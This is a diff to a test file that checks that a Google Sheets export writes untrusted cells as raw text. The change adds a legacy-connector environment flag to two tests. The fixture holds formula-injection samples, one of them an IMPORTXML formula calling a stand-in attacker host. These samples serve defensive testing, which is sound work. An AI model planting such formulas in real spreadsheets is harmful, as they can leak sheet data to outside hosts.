@@ -28,6 +28,7 @@ describe('Sheets export uses RAW for untrusted cells', () => {
     const values = [['=IMPORTXML("https://attacker.example")', '+1+1', '@SUM(A1:A2)']]
     const res = await onRequestPost({
       request: request({ action: 'append', spreadsheetId: 'sheet_123', sheetName: 'Clients', values }),
+      env: { LEGACY_GOOGLE_CONNECTORS_ENABLED: 'true' },
     } as never)
     expect(res.status).toBe(200)
     const [url, init] = googleFetchMock.mock.calls[0] as [string, RequestInit]
@@ -41,6 +42,7 @@ describe('Sheets export uses RAW for untrusted cells', () => {
       .mockResolvedValueOnce(new Response(JSON.stringify({ updates: {} }), { status: 200 }))
     const res = await onRequestPost({
       request: request({ action: 'create', title: 'Export', headers: ['=1+1', 'Client'] }),
+      env: { LEGACY_GOOGLE_CONNECTORS_ENABLED: 'true' },
     } as never)
     expect(res.status).toBe(200)
     expect(String(googleFetchMock.mock.calls[1]?.[0])).toContain('valueInputOption=RAW')
